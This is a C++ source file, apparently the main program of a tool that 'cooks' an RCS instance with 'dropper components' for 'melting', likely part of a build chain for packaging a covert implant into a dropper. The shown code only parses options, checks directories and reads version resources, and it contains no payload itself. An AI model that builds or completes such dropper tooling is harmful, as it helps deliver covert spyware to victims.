#include <iostream>
#include <string>

#include <boost/algorithm/string.hpp>
#include <boost/shared_ptr.hpp>
#include <boost/filesystem/fstream.hpp>
#include <boost/filesystem/operations.hpp>
#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include <boost/program_options.hpp>
namespace po = boost::program_options;

#include "DropperCode.h"
#include "Components.h"
#include "Cooker.h"
#include "RCS.h"

std::string productName;
std::string productVersion;

int cook(bf::path rcs_directory, bf::path components_directory, bf::path output_directory);
bool buildStub(RCS& ini);
bool printProductVersion();
bool findProductVersion();

int main(int argc, char* argv[])
{
	po::options_description desc("Allowed options");
	desc.add_options()
		("help", "this help message")
		("cook,C", "prepare RCS instance for melting")
		("rcs,R", po::value< string >(), "RCS directory")
		("dropper,d", po::value< string >()->default_value("components"), "dropper components directory")
		("ofile,O", po::value< string >()->default_value("cooked"), "output file")
		("version,V", "product version")
		;
	
	po::variables_map vm;
	po::store(po::parse_command_line(argc, argv, desc), vm);
	po::notify(vm);
	
	findProductVersion();
	
	if (vm.count("version")) {
		printProductVersion();
		return 0;
	}

	if (vm.count("help")) {
		cout << endl;
		printProductVersion();
		cout << endl;
		cout << desc << endl;
		return 0;
	}
	
	if (vm.count("cook")) {
		if ( ! vm.count("rcs") ) {
			cout << "RCS not specified." << endl;
			return 1;
		}
		
		bf::path rcs_directory = vm["rcs"].as< string >();
		bf::path components_directory = vm["dropper"].as<string>();
		bf::path output_filepath = vm["ofile"].as<string>();

		cout << "RCS directory       : \"" << rcs_directory << "\"" << endl;
		cout << "Components directory: \"" << components_directory << "\"" << endl;
		cout << "Output file         : \"" << output_filepath << "\"" << endl;
		
		int ret = 1;
		try {
			ret = cook(rcs_directory, components_directory, output_filepath);
		} catch (std::exception &e) {
			cout << "Cannot cook \"" << rcs_directory << "\": " << e.what() << endl;
			bf::remove(output_filepath);
			return 1;
		}
		
		return ret;
	}
	
	cout << desc << endl;
	return 1;
}

int cook(bf::path rcs_directory, bf::path components_directory, bf::path output_file)
{
	if ( ! bf::exists(rcs_directory) || ! bf::is_directory(rcs_directory) ) {
		cout << "Cannot find RCS directory \"" << rcs_directory << "\" or is not a directory." << endl;
		return 1;
	}
	
	if ( bf::exists(output_file) ) {
		bf::remove(output_file);
	}
	//bf::create_directories(output_file.parent_path());
	
	try {
		RCS rcs(rcs_directory);
		Components components;
		Cooker cook(rcs, components);
		cook.write( output_file ); // / bf::path(rcs.uid()).replace_extension(".cooked") );
	} catch (std::exception& e) {
		cout << "Error cooking: " << e.what() << endl;
		return 1;
	}
	
	return 0;
}

bool findProductVersion()
{
	// get the filename of the executable containing the version resource
	char szFilename[MAX_PATH + 1] = {0};
	if (GetModuleFileName(NULL, szFilename, MAX_PATH) == 0)
	{
		std::cout << "GetModuleFileName failed with error " << GetLastError() << std::endl;
		return false;
	}

	// allocate a block of memory for the version info
	DWORD dummy;
	DWORD dwSize = GetFileVersionInfoSize(szFilename, &dummy);
	if (dwSize == 0)
	{
		std::cout << "GetFileVersionInfoSize failed with error " << GetLastError() << std::endl;
		return false;
	}
	std::vector<BYTE> data(dwSize);

	// load the version info
	if (!GetFileVersionInfo(szFilename, NULL, dwSize, &data[0]))
	{
		std::cout << "GetFileVersionInfo failed with error " << GetLastError() << std::endl;
		return false;
	}

	// get the name and version strings
	LPVOID pvProductName = NULL;
	unsigned int iProductNameLen = 0;
	LPVOID pvProductVersion = NULL;
	unsigned int iProductVersionLen = 0;
	
	// replace "040904e4" with the language ID of your resources
	if (!VerQueryValue(&data[0], "\\StringFileInfo\\040904b0\\ProductName", &pvProductName, &iProductNameLen) ||
		!VerQueryValue(&data[0], "\\StringFileInfo\\040904b0\\ProductVersion", &pvProductVersion, &iProductVersionLen))
	{
		std::cout << "Can't obtain ProductName and ProductVersion from resources" << std::endl;
		return false;
	}

	productName = (char*) pvProductName;
	productVersion = (char*) pvProductVersion;
	boost::replace_all(productVersion, ",", ".");

	return true;
}

bool printProductVersion()
{
	std::cout << productName << " " << productVersion << std::endl;
	return true;
}
